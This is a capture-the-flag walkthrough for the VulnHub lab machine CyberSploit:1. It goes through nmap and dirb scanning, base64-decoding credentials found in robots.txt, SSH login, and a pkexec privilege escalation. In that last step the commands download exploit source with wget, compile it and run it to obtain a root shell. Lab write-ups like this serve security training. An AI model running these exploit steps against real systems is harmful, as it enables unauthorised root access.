

# CyberSploit:1 Walkthrough

**VulnHub Link:** [CyberSploit:1](https://www.vulnhub.com/entry/cybersploit-1,506/)
**Difficulty:** Easy
**Release Date:** 9 Jul 2020


## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.175
```
## 2.Web Enumeration
```bash
dirb http://192.168.100.175
```

from main page source , we found username ---> itsskv

from robots.txt we obtain base64 encoded text and 

```bash
echo "R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9" | base64 -d
```

we found out cybersploit{youtube.com/c/cybersploit} is password of ssh service

itsskv shell opened ..!

We found flag2 and converting to 

good work ! 
flag2: cybersploit{https:t.me/cybersploit1}

## 3.Privilege Escalation

```bash
find / -perm /4000 2>/dev/null
```
pkexec vulnerability found

```bash
wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/CyberSploit%3A1/exploit.c
wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/CyberSploit%3A1/evil-so.c
gcc -shared -o evil.so -fPIC evil-so.c
gcc exploit.c -o exploit
./evil.so
./exploit
```

and   BOOOMM ..!   We obtain root shell...!
